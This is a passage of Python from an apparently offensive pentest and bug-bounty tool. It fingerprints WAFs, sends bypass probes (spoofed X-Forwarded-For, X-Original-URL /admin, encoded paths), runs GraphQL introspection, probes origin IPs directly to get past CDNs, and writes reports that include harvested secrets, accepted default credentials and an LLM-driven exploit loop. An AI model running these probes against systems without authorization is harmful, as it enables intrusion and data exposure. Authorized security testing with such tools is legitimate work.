        findings.append({"kind": "third_party_sdks", "hosts": sorted(sdk_hosts)[:30], "count": len(sdk_hosts)})
    return findings

def bb_waf_fingerprint(urls, timeout=30):
    """Fingerprint the WAF/CDN product from headers + block pages, then test a
    battery of common WAF bypasses (header spoofing, path encoding, HTTP method
    variance) against a live URL and report which ones change the response."""
    findings = []
    if not urls:
        return findings
    url = urls[0]
    try:
        status, hdrs, body = http_get_retry(url, timeout=6)
    except Exception:
        return findings
    h = {k.lower(): v for k, v in hdrs.items()}
    combined = " ".join(f"{k}: {v}" for k, v in hdrs.items()).lower() + " " + (body or "").lower()[:2000]
    waf = "Unknown"
    if "cf-ray" in h or "cf-cache-status" in h or "__cf_bm" in combined or "cloudflare" in combined:
        waf = "Cloudflare"
    elif "x-amz-cf-id" in h or "x-amz-cf-pop" in h:
        waf = "CloudFront"
    elif "akamai" in combined or "x-akamai" in h:
        waf = "Akamai"
    elif "incapsula" in combined or "visid_incap" in combined:
        waf = "Imperva/Incapsula"
    elif "sucuri" in combined:
        waf = "Sucuri"
    elif "fastly" in combined:
        waf = "Fastly"
    elif "mod_security" in combined or "modsecurity" in combined:
        waf = "ModSecurity"
    elif "aws waf" in combined or "awswaf" in combined:
        waf = "AWS WAF"
    elif "f5" in combined and ("bigip" in combined or "aspxerror" in combined):
        waf = "F5 BIG-IP ASM"
    # bypass battery
    bypasses = []
    base_signature = (status, len(body or ""))
    tests = [
        ("X-Forwarded-For spoof", {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"}),
        ("X-Original-URL / X-Rewrite-URL", {"X-Original-URL": "/admin", "X-Rewrite-URL": "/admin"}),
        ("Case randomization", {}),
        ("Path encoding", {}),
        ("HTTP verb tampering", {}),
        ("Content-Type bypass", {"Content-Type": "application/json"}),
    ]
    # special URL variants
    url_variants = {
        "Case randomization": url.rstrip("/") + "/AdMiN",
        "Path encoding": url.rstrip("/") + "/%61dmin",
        "HTTP verb tampering": url,
    }
    for name, hdr_extra in tests:
        try:
            if name in url_variants:
                turl = url_variants[name]
            else:
                turl = url
            s2, h2, b2 = http_get_retry(turl, timeout=5, extra_headers=hdr_extra or None)
            sig = (s2, len(b2 or ""))
            if sig != base_signature and s2 != 0:
                bypasses.append({"test": name, "status": s2, "differs_from_baseline": True, "url": turl})
        except Exception:
            continue
    findings.append({
        "kind": "waf_fingerprint",
        "url": url,
        "waf": waf,
        "status": status,
        "server": h.get("server", ""),
        "bypasses": bypasses[:20],
    })
    return findings

def bb_openapi_discovery(base_urls, domain, timeout=30):
    """Probe for OpenAPI/Swagger/GraphQL spec files, parse endpoints from them,
    and test GraphQL introspection."""
    findings = []
    candidates = set()
    for b in base_urls[:5]:
        root = b.rstrip("/")
        for p in ["/openapi.json", "/swagger.json", "/swagger/v1/swagger.json", "/api-docs", "/api/openapi.json", "/v2/api-docs", "/v3/api-docs", "/.well-known/openapi.json", "/graphql", "/graphiql", "/playground"]:
            candidates.add(root + p)
    spec_eps = set()
    for c in list(candidates)[:25]:
        try:
            status, hdrs, body = http_get_retry(c, timeout=5)
            if status != 200 or not body:
                continue
            ct = hdrs.get("Content-Type", "")
            if "json" in ct.lower() or (body.lstrip().startswith("{") or body.lstrip().startswith("[")):
                findings.append({"kind": "spec_found", "url": c, "status": status, "content_type": ct, "body_preview": body[:200]})
                # extract paths from openapi/swagger JSON
                try:
                    doc = json.loads(body)
                    paths = doc.get("paths", {})
                    for p in list(paths.keys())[:100]:
                        spec_eps.add(p)
                except Exception:
                    pass
                if "graphql" in c.lower() or "/graphiql" in c.lower():
                    findings.append({"kind": "graphql_endpoint", "url": c, "status": status, "body_preview": body[:150]})
                    # introspection probe
                    try:
                        gq = '{"query":"{ __schema { types { name } } }"}'
                        req = urllib.request.Request(c, data=gq.encode(), headers={"Content-Type": "application/json", **stealth.headers()})
                        ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                        resp = urllib.request.urlopen(req, timeout=6, context=ctx)
                        gbody = resp.read().decode("utf-8", errors="ignore")
                        resp.close()
                        if '"data"' in gbody and "__schema" in gbody:
                            findings.append({"kind": "graphql_introspection_open", "url": c, "evidence": "introspection query returned type schema (unauth)"})
                        elif "errors" in gbody:
                            findings.append({"kind": "graphql_endpoint", "url": c, "status": 200, "body_preview": gbody[:150]})
                    except urllib.error.HTTPError as e:
                        if e.code in (400, 405):
                            findings.append({"kind": "graphql_endpoint", "url": c, "status": e.code})
                    except Exception:
                        pass
        except Exception:
            continue
    if spec_eps:
        findings.append({"kind": "openapi_paths", "endpoints": sorted(spec_eps)[:150], "count": len(spec_eps)})
    return findings

def bb_origin_retest(domain, origins, paths, timeout=30):
    """Re-test confirmed origin IPs directly (bypassing the CDN/WAF): probe the
    same sensitive paths against the origin and compare to the CDN-wrapped
    response. Differences reveal WAF-masked content or dev-only endpoints."""
    findings = []
    confirmed = [o for o in (origins or []) if o.get("confirmed") and not o.get("is_cdn")]
    if not confirmed:
        return findings
    test_paths = paths or ["/", "/admin", "/api", "/.env", "/swagger", "/api-docs", "/graphql", "/health", "/actuator"]
    for o in confirmed[:5]:
        ip = o["ip"]
        host = o.get("host") or domain
        for p in test_paths:
            if not p.startswith("/"):
                p = "/" + p
            orig_url = f"http://{ip}{p}"
            try:
                os_, oh, ob = http_get_retry(orig_url, timeout=5, host_header=host, no_redirect=True)
            except Exception:
                continue
            if os_ == 0:
                continue
            # CDN comparison via the real hostname
            cdn_url = f"https://{host}{p}"
            cs_ = 0
            try:
                cs_, _, _ = http_get_retry(cdn_url, timeout=5)
            except Exception:
                pass
            differs = cs_ != os_ or (os_ == 200 and cs_ != 200)
            severity = "medium"
            issue = "origin_differs_from_cdn"
            if os_ == 200 and cs_ in (0, 403, 404, 502):
                severity = "high"
                issue = "content_masked_by_cdn"
            if differs:
                findings.append({
                    "url": f"http://{ip}{p}",
                    "host": host,
                    "origin_ip": ip,
                    "path": p,
                    "origin_status": os_,
                    "cdn_status": cs_,
                    "origin_len": len(ob or ""),
                    "server": oh.get("Server", ""),
                    "issue": issue,
                    "severity": severity,
                    "evidence": f"origin HTTP {os_}({len(ob or '')}b) vs CDN HTTP {cs_}",
                })
    return findings

def _cf_hunt_adapter(domain, subs=None, time_budget=140):
    """Run the dedicated CloudFront/CDN origin hunt (cloudfront_hunt.py) and
    normalize its output into the bb_origins format. Falls back gracefully if
    the module is missing."""
    try:
        import cloudfront_hunt as cfh
    except Exception:
        return {}
    try:
        rep = cfh.hunt(domain, list(subs or [])[:45], time_budget=time_budget)
        origins = []
        for o in rep.get("origin_ips", []):
            origins.append({
                "ip": o.get("ip", ""),
                "host": o.get("host", ""),
                "cdn": o.get("cdn", ""),
                "is_cdn": bool(o.get("is_cdn")),
                "confirmed": bool(o.get("confirmed")),
                "evidence": o.get("evidence", ""),
            })
        rep["origin_ips"] = origins
        return rep
    except Exception:
        return {}

# ─── REPORT GENERATION ──────────────────────────────────────────

def generate_report(data):
    """Generate a professional markdown report."""
    domain = data["domain"]
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")

    lines = []
    lines.append(f"# Infrastructure Report: {domain}")
    lines.append(f"**Generated:** {ts}")
    lines.append(f"**Tool:** MrBOOM One-Shot")
    lines.append(f"**Model:** {data.get('model', 'N/A')}")
    lines.append("")

    lines.append("## Executive Summary")
    lines.append("")
    lines.append(f"- **Target:** {domain}")
    lines.append(f"- **Subdomains Found:** {len(data.get('subdomains', []))}")
    lines.append(f"- **Live HTTP Services:** {sum(1 for v in data.get('http', {}).values() if v.get('status', 0) == 200)}")
    lines.append(f"- **Open Ports:** {sum(len(v) for v in data.get('ports', {}).values())}")
    lines.append(f"- **S3 Buckets Discovered:** {len(data.get('s3', {}))}")
    lines.append(f"- **API Endpoints Found:** {len(data.get('api_endpoints', []))}")
    lines.append(f"- **Third-Party Integrations:** {len(data.get('csp', {}).get('third_party', []))}")
    lines.append(f"- **Origin IPs (CF Bypass):** {len(data.get('origins', []))}")
    lines.append(f"- **WAF Detected:** {', '.join(data.get('waf', [])) or 'None'}")
    lines.append(f"- **Security Headers Missing:** {len(data.get('missing_security_headers', []))}")
    lines.append(f"- **Org:** {data.get('whois', {}).get('org', 'N/A')}")
    lines.append(f"- **Wayback URLs:** {len(data.get('wayback', {}).get('urls', []))}")
    lines.append(f"- **New Subdomains (brute):** {len(data.get('bb_new_subdomains', []))}")
    fp = data.get("bb_dirbust_fp", {})
    lines.append(f"- **Directories Found:** {sum(len(v) for v in data.get('bb_dirbust', {}).values())} ({fp.get('false_positives', 0)} catch-all false positives filtered)")
    lines.append(f"- **Takeover Candidates:** {sum(1 for t in data.get('bb_takeover', []) if t.get('vulnerable'))}")
    lines.append(f"- **CORS Issues:** {len(data.get('bb_cors', []))}")
    lines.append(f"- **Open Redirects:** {len(data.get('bb_open_redirect', []))}")
    lines.append(f"- **XSS Candidates:** {sum(1 for f in data.get('bb_injection', []) if f.get('type') == 'XSS')}")
    lines.append(f"- **App-Level Vulns (cmd-inj/SSRF/traversal/SQLi):** {len(data.get('bb_webapp', []))}")
    lines.append(f"- **Exposed Endpoints:** {len(data.get('bb_health_endpoints', []))}")
    lines.append(f"- **Origin IPs (CDN Bypass):** {sum(1 for o in data.get('bb_origins', []) if o.get('confirmed'))}")
    lines.append(f"- **Login/Rate-Limit Issues:** {sum(1 for f in data.get('bb_login', []) if 'issue' in f)}")
    lines.append(f"- **Source-Map Endpoints:** {sum(len(r.get('endpoints', [])) for r in data.get('bb_sourcemap', []) if r.get('kind') == 'sourcemap_endpoints')}")
    lines.append(f"- **Wayback Secrets:** {sum(len(r.get('secrets', [])) for r in data.get('bb_wayback', []) if r.get('kind') == 'wayback_secrets')}")
    lines.append(f"- **Default Creds Accepted:** {len(data.get('bb_default_creds', []))}")
    lines.append(f"- **JWT/API Auth Bypass:** {sum(1 for f in data.get('bb_jwt', []) if f.get('severity') == 'critical')}")
    lines.append(f"- **Live API Hosts:** {sum(1 for a in data.get('bb_api', []) if a.get('kind') == 'api_host')}")
    lines.append(f"- **JS Bundles Analyzed:** {sum((r.get('count', 0) if r.get('kind') == 'js_inventory' else 0) for r in data.get('bb_js', []))}")
    js_sec = sum((r.get('count', 0) if r.get('kind') == 'js_secrets' else 0) for r in data.get('bb_js', []))
    if js_sec:
        lines.append(f"- **Hardcoded Secrets in JS:** {js_sec}")
    waf_fp = [r for r in data.get('bb_waf', []) if r.get('kind') == 'waf_fingerprint']
    if waf_fp:
        lines.append(f"- **WAF Fingerprint:** {waf_fp[0].get('waf', 'Unknown')} ({len(waf_fp[0].get('bypasses', []))} bypass probes differ)")
    lines.append(f"- **OpenAPI/Swagger/GraphQL Specs:** {sum(1 for r in data.get('bb_openapi', []) if r.get('kind') == 'spec_found')} | GraphQL introspection open: {sum(1 for r in data.get('bb_openapi', []) if r.get('kind') == 'graphql_introspection_open')}")
    lines.append(f"- **Origin Re-test Discrepancies:** {len(data.get('bb_origin_retest', []))}")
    cf_hunt = data.get("bb_cf_hunt", {})
    if cf_hunt.get("origin_ips"):
        lines.append(f"- **Dedicated CDN Origin Hunt:** {len([o for o in cf_hunt.get('origin_ips', []) if o.get('confirmed')])} confirmed origins, {len(cf_hunt.get('cdn_edges', []))} CDN edges filtered")
        if cf_hunt.get("cloudfront"):
            lines.append(f"- **CloudFront Distribution Confirmed:** POP {cf_hunt.get('cloudfront_pop') or 'n/a'} (server: {cf_hunt.get('cloudfront_server') or 'n/a'})")
    attack = data.get("bb_attack", [])
    if attack:
        attack_by_sev = {}
        for f in attack:
            attack_by_sev[f.get("severity", "low")] = attack_by_sev.get(f.get("severity", "low"), 0) + 1
        sev_summary = ", ".join(f"{k.upper()} {v}" for k, v in sorted(attack_by_sev.items()))
        lines.append(f"- **Active Exploit Findings:** {len(attack)} ({sev_summary})")
        lines.append(f"- **Exploitable Types:** {', '.join(sorted(set(f.get('type', '?') for f in attack))[:8])}")
    validations = data.get("bb_validations", [])
    if validations:
        val_by_sev = {}
        for f in validations:
            val_by_sev[f.get("severity", "low")] = val_by_sev.get(f.get("severity", "low"), 0) + 1
        val_summary = ", ".join(f"{k.upper()} {v}" for k, v in sorted(val_by_sev.items()))
        lines.append(f"- **Web Configuration Validations:** {len(validations)} findings ({val_summary})")
        lines.append(f"- **Validation Types:** {', '.join(sorted(set(f.get('type', '?') for f in validations))[:8])}")
    ptt = data.get("bb_ptt")
    if ptt and ptt.get("nodes"):
        unresolved = [n for n in ptt["nodes"] if n.get("status") == "unresolved"]
        lines.append(f"- **Pentest Task Tree:** {len(ptt['nodes'])} tasks across {len(ptt.get('stages', []))} stages ({len(unresolved)} unresolved)")
    agentic = data.get("bb_agentic")
    if agentic:
        lines.append(f"- **Agentic Exploit Steps:** {len(agentic)} LLM-proposed probes executed")
    agentic_findings = data.get("bb_agentic_findings", [])
    if agentic_findings:
        lines.append(f"- **Agentic Discovered Findings:** {len(agentic_findings)} (unauthenticated API / auth-bypass)")
    lines.append("")

    if data.get("ai_analysis"):
        lines.append("## AI Breach Assessment")
        lines.append("")
        lines.append(data["ai_analysis"])
        lines.append("")

    findings = data.get("findings") or []
    lines.append("## Findings Overview & Scorecard")
    lines.append("")
    sev_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    for f in findings:
        sev_counts[f.get("severity", "INFO").upper()] = sev_counts.get(f.get("severity", "INFO").upper(), 0) + 1
    lines.append("| Severity | Count | CVSS v3.1 (avg) |")
    lines.append("|----------|-------|-----------------|")
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        if sev_counts[sev]:
            _vec, _score, _rating = severity_cvss(sev)
            lines.append(f"| {sev} | {sev_counts[sev]} | {_score:.1f} ({_rating}) |")
    lines.append("")

    if findings:
        lines.append("### Detailed Findings & Remediation")
        lines.append("")
        lines.append("| # | Severity | CVSS | Finding | Asset | CWE |")
        lines.append("|---|----------|------|---------|-------|-----|")
        for i, f in enumerate(sorted(findings, key=lambda x: -x.get("score", 0))[:40], 1):
            _vec, _score, _rating = severity_cvss(f.get("severity"))
            lines.append(f"| {i} | {f.get('severity','')} | {_score:.1f} | {str(f.get('title',''))[:70]} | {f.get('asset','')} | {f.get('cwe','')} |")
        lines.append("")
        lines.append("#### Remediation Actions")
        lines.append("")
        lines.append("| # | Finding | Recommended Fix | Retest |")
        lines.append("|---|---------|-----------------|--------|")
        for i, f in enumerate(sorted(findings, key=lambda x: -x.get("score", 0))[:40], 1):
            lines.append(f"| {i} | {str(f.get('title',''))[:60]} | {str(f.get('fix',''))[:120]} | {f.get('retest','—')} |")
        lines.append("")
        lines.append("#### Evidence Archive")
        lines.append("")
        lines.append("| # | Finding | Evidence |")
        lines.append("|---|---------|----------|")
        for i, f in enumerate(sorted(findings, key=lambda x: -x.get("score", 0))[:40], 1):
            lines.append(f"| {i} | {str(f.get('title',''))[:60]} | `{str(f.get('evidence',''))[:100]}` |")
        lines.append("")

    scope = data.get("scope") or [domain]
    if isinstance(scope, str):
        scope = [scope]
    exclusions = data.get("exclusions") or []
    if isinstance(exclusions, str):
        exclusions = [exclusions]
    lines.append("## Scope & Authorization")
    lines.append("")
    lines.append("- **Authorized target(s):** " + ", ".join(scope))
    if exclusions:
        lines.append("- **Excluded:** " + ", ".join(exclusions))
    lines.append("- **Assessment type:** Authorized penetration test / security audit (external, black-box)")
    lines.append("- **Legal note:** Findings are provided for remediation purposes only. Testing was performed with explicit authorization for the scoped targets above.")
    lines.append("")

    lines.append("## Methodology")
    lines.append("")
    lines.append("1. **Recon** — subdomain enumeration, live-host discovery (httpx), DNS and WHOIS review.")
    lines.append("2. **Discovery** — port scanning, banner grabbing, TLS analysis, origin-IP (WAF bypass) hunting.")
    lines.append("3. **Vulnerability scanning** — nuclei (non-intrusive templates), version-aware CVE correlation (cvemap).")
    lines.append("4. **Web application checks** — client-side assessment (cookies, CSP, SRI, service workers, WebSockets, DOM-XSS), JS/API endpoint extraction, source-map review.")
    lines.append("5. **Validation & reporting** — manual validation of critical paths, evidence capture, remediation guidance.")
    lines.append("")

    if data.get("ai_0day_hypotheses"):
        lines.append("## AI Novel Attack Hypotheses (0-day Research)")
        lines.append("")
        lines.append(data["ai_0day_hypotheses"])
        lines.append("")

    lines.append("## DNS Records")
    lines.append("")
    lines.append(f"| Record | Value |")
    lines.append(f"|--------|-------|")
    for rtype in ["A", "MX", "NS", "TXT"]:
        vals = data.get("dns", {}).get(rtype, [])
        if vals:
            lines.append(f"| {rtype} | {', '.join(vals)} |")
    lines.append("")

    subs = data.get("subdomains", [])
    if subs:
        lines.append("## Subdomains Discovered")
        lines.append("")
        lines.append(f"**Total: {len(subs)}**")
        lines.append("")
        for s in subs:
            lines.append(f"- `{s}`")
        lines.append("")

    http_results = data.get("http", {})
    if http_results:
        lines.append("## HTTP Services")
        lines.append("")
        lines.append(f"| URL | Status | Server | Tech | Title |")
        lines.append(f"|-----|--------|--------|------|-------|")
        for url, info in sorted(http_results.items()):
            status = info.get("status", 0)
            server = info.get("server", "")[:30]
            tech = ", ".join(info.get("tech", []))[:30]
            title = info.get("title", "")[:40]
            lines.append(f"| {url} | {status} | {server} | {tech} | {title} |")
        lines.append("")

    ports = data.get("ports", {})
    if ports:
        lines.append("## Open Ports")
        lines.append("")
        lines.append(f"| IP | Ports |")
        lines.append(f"|----|-------|")
        for ip, port_list in ports.items():
            lines.append(f"| {ip} | {', '.join(str(p) for p in port_list)} |")
        lines.append("")

    s3_results = data.get("s3", {})
    if s3_results:
        lines.append("## S3 Buckets")
        lines.append("")
        lines.append(f"| Bucket | Access |")
        lines.append(f"|--------|--------|")
        for key, val in s3_results.items():
            access = "PUBLIC" if val.get("public") else "RESTRICTED"
            lines.append(f"| {key} | {access} |")
        lines.append("")

    api = data.get("api_endpoints", [])
    if api:
        lines.append("## API Endpoints")
        lines.append("")
        lines.append(f"**Total: {len(api)}**")
        lines.append("")
        for ep in api[:30]:
            lines.append(f"- `{ep}`")
        if len(api) > 30:
            lines.append(f"  *...and {len(api) - 30} more*")
        lines.append("")

    third = data.get("csp", {}).get("third_party", [])
    if third:
        lines.append("## Third-Party Integrations")
        lines.append("")
        for t in sorted(third)[:20]:
            lines.append(f"- {t}")
        lines.append("")

    whois = data.get("whois", {})
    if whois.get("org"):
        lines.append("## Domain Intelligence")
        lines.append("")
        lines.append(f"- **Organization:** {whois.get('org', 'N/A')}")
        lines.append(f"- **Registrar:** {whois.get('registrar', 'N/A')}")
        lines.append(f"- **Country:** {whois.get('country', 'N/A')}")
        if whois.get("emails"):
            lines.append(f"- **Abuse Emails:** {', '.join(whois['emails'][:3])}")
        if whois.get("nameservers"):
            lines.append(f"- **Nameservers:** {', '.join(whois['nameservers'][:4])}")
        lines.append("")

    waf = data.get("waf", [])
    if waf:
        lines.append("## WAF Detection")
        lines.append("")
        lines.append(f"Detected WAF/Proxy: **{', '.join(waf)}**")
        lines.append("")

    missing_sec = data.get("missing_security_headers", [])
    if missing_sec:
        lines.append("## Missing Security Headers")
        lines.append("")
        for h in missing_sec:
            lines.append(f"- `{h}`")
        lines.append("")

    if data.get("exploit_analysis"):
        lines.append("## Exploit Chain Analysis")
        lines.append("")
        lines.append(data["exploit_analysis"])
        lines.append("")

    origins = data.get("origins", [])
    if origins:
        non_cdn = [o for o in origins if not _ip_in_cdn(o.get("ip", ""))[0]]
        if non_cdn:
            lines.append("## Origin IPs (Cloudflare Bypass)")
            lines.append("")
            lines.append("*Only non-CDN edge IPs are listed — CDN addresses are filtered as they are not real origins.*")
            lines.append("")
            lines.append(f"| Subdomain | IP |")
            lines.append(f"|-----------|-----|")
            for o in non_cdn:
                lines.append(f"| {o.get('subdomain', '?')} | {o.get('ip', '?')} |")
            lines.append("")

    secrets = data.get("secrets", [])
    if secrets:
        lines.append("## Potential Secrets Found")
        lines.append("")
        for s in secrets[:30]:
            lines.append(f"- `{s[:100]}`")
        lines.append("")

    # ── Bug Bounty Findings ──

    wayback = data.get("wayback", {})
    if wayback and wayback.get("urls"):
        lines.append("## Wayback Machine History")
        lines.append("")
        lines.append(f"**{len(wayback['urls'])}** historical URLs archived.")
        lines.append("")
        for u in wayback["urls"][:20]:
            lines.append(f"- `{u}`")
        if len(wayback["urls"]) > 20:
            lines.append(f"  *...and {len(wayback['urls']) - 20} more*")
        lines.append("")

    dirbust = data.get("bb_dirbust", {})
    if dirbust:
        lines.append("## Exposed Directories / Files")
        lines.append("")
        lines.append("*Note: paths matching the target's catch-all response (random-path baseline) are filtered as false positives.*")
        lines.append("")
        fp = data.get("bb_dirbust_fp", {})
        btr = fp.get("by_target", {})
        for target, paths in dirbust.items():
            lines.append(f"**{target}**")
            if btr.get(target):
                info = btr[target]
                lines.append(f"  *(candidates: {info.get('candidates', 0)}, real: {info.get('real', 0)}, false positives filtered: {info.get('false_positives', 0)})*")
            lines.append("")
            for path, code, length in paths[:20]:
                lines.append(f"- `{path}` → {code} ({length}b)")
            lines.append("")
        lines.append("")

    takeover = data.get("bb_takeover", [])
    if takeover:
        lines.append("## Subdomain Takeover Checks")
        lines.append("")
        lines.append("| Subdomain | Service | CNAME | Vulnerable |")
        lines.append("|-----------|---------|-------|------------|")
        for t in takeover:
            lines.append(f"| {t.get('subdomain', '?')} | {t.get('service', '?')} | {t.get('cname', '?')} | {'⚠️ YES' if t.get('vulnerable') else 'No'} |")
        lines.append("")

    cors = data.get("bb_cors", [])
    if cors:
        lines.append("## CORS Misconfigurations")
        lines.append("")
        for c in cors:
            lines.append(f"- `{c.get('url', '?')}` — {c.get('issue', '?')} (severity: {c.get('severity', '?')})")
        lines.append("")

    validations = data.get("bb_validations", [])
    if validations:
        lines.append("## Web Configuration Validations")
        lines.append("")
        lines.append("| # | Severity | Check | Target | Evidence |")
        lines.append("|---|----------|-------|--------|----------|")
        for i, v in enumerate(sorted(validations, key=lambda x: -x.get("score", 0))[:30], 1):
            lines.append(f"| {i} | {v.get('severity', '')} | {str(v.get('title', '') or v.get('type', ''))[:50]} | {v.get('url', '')} | `{str(v.get('evidence', ''))[:80]}` |")
        lines.append("")
        for v in sorted(validations, key=lambda x: -x.get("score", 0))[:15]:
            if v.get("fix"):
                lines.append(f"- **{v.get('title', '') or v.get('type', '')}** → {v.get('fix', '')}")
        lines.append("")

    redirects = data.get("bb_open_redirect", [])
    if redirects:
        lines.append("## Open Redirect Tests")
        lines.append("")
        for r in redirects:
            lines.append(f"- `{r.get('url', '?')}` → `{r.get('redirects_to', '?')}`")
        lines.append("")

    injections = data.get("bb_injection", [])
    if injections:
        lines.append("## Injection Scan Results")
        lines.append("")
        for inj in injections:
            lines.append(f"- **{inj.get('type', '?')}**: `{inj.get('url', '?')}` (payload: `{inj.get('payload', '?')}`)")
        lines.append("")

    attack = data.get("bb_attack", [])
    if attack:
        lines.append("## Active Exploit Findings")
        lines.append("")
        order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
        for f in sorted(attack, key=lambda x: order.get(x.get("severity", "low"), 9)):
            lines.append(f"### {f.get('severity', 'low').upper()}: {f.get('type', '?')}")
            lines.append("")
            lines.append(f"- **URL:** `{f.get('url', '?')}`")
            lines.append(f"- **Method/Param:** {f.get('method', 'GET')} `{f.get('param', '?')}`")
            lines.append(f"- **CWE:** {f.get('cwe', '?')}")
            lines.append(f"- **Payload:** `{f.get('payload', '?')}`")
            lines.append(f"- **Evidence:** {f.get('evidence', '')}")
            if f.get("elapsed_s"):
                lines.append(f"- **Observed delay:** {f['elapsed_s']}s")
            lines.append("")
        lines.append("")

    ptt = data.get("bb_ptt")
    if ptt and ptt.get("nodes"):
        lines.append("## Pentest Task Tree (PTT)")
        lines.append("")
        lines.append("| Stage | Task | Status | Detail |")
        lines.append("|-------|------|--------|--------|")
        for n in ptt["nodes"]:
            icon = {"done": "✅", "pending": "⏳", "unresolved": "⚠️"}.get(n.get("status", "pending"), "❓")
            detail = str(n.get("detail") or "")[:80].replace("|", "/")
            lines.append(f"| {n.get('stage','?')} | {n.get('task','?')} | {icon} {n.get('status','?')} | {detail} |")
        lines.append("")

    agentic = data.get("bb_agentic")
    if agentic:
        lines.append("## Agentic Exploit Loop (LLM-proposed)")
        lines.append("")
        lines.append("| Iter | Command | Method | Status | Outcome | Evidence |")
        lines.append("|------|---------|--------|--------|---------|----------|")
        for s in agentic:
            ev = (s.get("evidence") or "")[:80].replace("|", "/")
            lines.append(f"| {s.get('iter','?')} | `{s.get('command','')[:90]}` | {s.get('method','GET')} | {s.get('status','?')} | {s.get('outcome','')} | {ev} |")
        lines.append("")

    agentic_findings = data.get("bb_agentic_findings", [])
    if agentic_findings:
        lines.append("## Agentic Discovered Findings")
        lines.append("")
        lines.append("| Severity | Finding | Endpoint | Evidence |")
        lines.append("|----------|---------|----------|----------|")
        for f in agentic_findings:
            lines.append(f"| {f.get('severity','?')} | {f.get('title','?')} | `{f.get('url','?')}` | {str(f.get('evidence',''))[:90].replace('|','/')} |")
        lines.append("")

    health = data.get("bb_health_endpoints", [])
    if health:
        lines.append("## Exposed Health/Debug Endpoints")
        lines.append("")
        for h in health:
            lines.append(f"- `{h.get('url', '?')}` → {h.get('status', '?')}")
        lines.append("")

    origins = data.get("bb_origins", [])
    if origins:
        lines.append("## Origin IP Analysis (CDN/WAF Bypass)")
        lines.append("")
        confirmed = [o for o in origins if o.get("confirmed")]
        if not confirmed:
            lines.append("*No non-CDN origin IPs could be confirmed as direct origins.*")
            lines.append("")
        lines.append("| IP | CDN | Direct Origin | Status | Evidence |")
        lines.append("|----|-----|---------------|--------|----------|")
        for o in origins:
            if o.get("is_cdn"):
                continue
            status_txt = "confirmed" if o.get("confirmed") else "unconfirmed"
            origin_txt = "YES" if o.get("confirmed") else "no"
            lines.append(f"| {o.get('ip', '?')} | {o.get('cdn', '') or 'no'} | {origin_txt} | {status_txt} | {o.get('evidence', '')[:60]} |")
        lines.append("")
        lines.append("*CDN edge IPs (Cloudflare/Akamai/Fastly/CloudFront ranges) are excluded — they are not real origins.*")
        lines.append("")

    login = data.get("bb_login", [])
    if login:
        lines.append("## Login / Rate-Limit Analysis")
        lines.append("")
        for f in login:
            if "issue" in f:
                lines.append(f"- **{f.get('issue', '?')}**: `{f.get('url', '?')}` (severity: {f.get('severity', '?')})")
            else:
                lines.append(f"- `{f.get('url', '?')}` → HTTP {f.get('status', '?')} (attempt {f.get('attempt', '?')})")
        lines.append("")

    sm = data.get("bb_sourcemap", [])
    if sm:
        lines.append("## Source-Map / JS Endpoint Extraction")
        lines.append("")
        for r in sm:
            if r.get("kind") == "sourcemap_endpoints":
                lines.append(f"**{len(r.get('endpoints', []))} endpoints found:**")
                for ep in r.get("endpoints", [])[:60]:
                    lines.append(f"- `{ep}`")
        lines.append("")

    api_disc = data.get("bb_api", [])
    if api_disc:
        lines.append("## API Discovery & Auth Requirements")
        lines.append("")
        for a in api_disc:
            lines.append(f"- `{a.get('url', '?')}` → HTTP {a.get('status', '?')} [{'JSON API' if a.get('api') else 'html'}] server={a.get('server', '?')}")
            if a.get("body_preview"):
                lines.append(f"  - body: `{a.get('body_preview', '')[:120]}`")
        lines.append("")

    wb = data.get("bb_wayback", [])
    if wb:
        lines.append("## Wayback Archive Analysis")
        lines.append("")
        for r in wb:
            if r.get("kind") == "wayback_secrets":
                lines.append("**Secrets/tokens in archived URLs:**")
                for s in r.get("secrets", [])[:30]:
                    lines.append(f"- `{s}`")
            if r.get("kind") == "wayback_interesting":
                lines.append("**Sensitive archived paths:**")
                for u in r.get("urls", [])[:40]:
                    lines.append(f"- `{u}`")
        lines.append("")

    creds = data.get("bb_default_creds", [])
    if creds:
        lines.append("## Default Credential Test")
        lines.append("")
        for c in creds:
            lines.append(f"- **{c.get('username', '?')}/{c.get('password', '?')}** on `{c.get('url', '?')}` — {c.get('issue', 'accepted')} (severity: {c.get('severity', '?')})")
        lines.append("")

    jwt = data.get("bb_jwt", [])
    if jwt:
        lines.append("## JWT / API Authentication")
        lines.append("")
        for j in jwt:
            lines.append(f"- **{j.get('issue', '?')}**: `{j.get('url', '?')}` (severity: {j.get('severity', '?')}) {j.get('evidence', '')}")
        lines.append("")

    js_assets = data.get("bb_js", [])
    if js_assets:
        lines.append("## JavaScript Asset Analysis")
        lines.append("")
        for r in js_assets:
            if r.get("kind") == "js_inventory":
                lines.append(f"**{r.get('count', 0)} JS bundles analyzed:**")
                lines.append("")
                lines.append("| Script | Size | Server |")
                lines.append("|--------|------|--------|")
                for s in r.get("scripts", [])[:30]:
                    lines.append(f"| `{s.get('url','')}` | {s.get('size','?')} | {s.get('server','')} |")
                lines.append("")
            if r.get("kind") == "js_endpoints":
                lines.append(f"**{r.get('count', 0)} API endpoints extracted from JS:**")
                lines.append("")
                for ep in r.get("endpoints", [])[:40]:
                    lines.append(f"- `{ep}`")
                lines.append("")
            if r.get("kind") == "js_secrets":
                lines.append(f"**{r.get('count', 0)} potential secrets/keys found in JS:**")
                lines.append("")
                for s in r.get("secrets", [])[:25]:
                    lines.append(f"- **{s.get('kind','?')}** (from `{s.get('source','')}`): `{s.get('value','')}`")
                lines.append("")
            if r.get("kind") == "graphql_operations":
                lines.append(f"**{r.get('count', 0)} GraphQL operations in JS:**")
                lines.append("")
                for op in r.get("operations", [])[:25]:
                    lines.append(f"- `{op}`")
                lines.append("")
            if r.get("kind") == "third_party_sdks":
                lines.append(f"**{r.get('count', 0)} third-party SDK hosts:**")
                lines.append("")
                for h in r.get("hosts", [])[:20]:
                    lines.append(f"- `{h}`")
                lines.append("")

    waf_fp = data.get("bb_waf", [])
    if waf_fp:
        lines.append("## WAF Fingerprint & Bypass Tests")
        lines.append("")
        for r in waf_fp:
            if r.get("kind") != "waf_fingerprint":
                continue
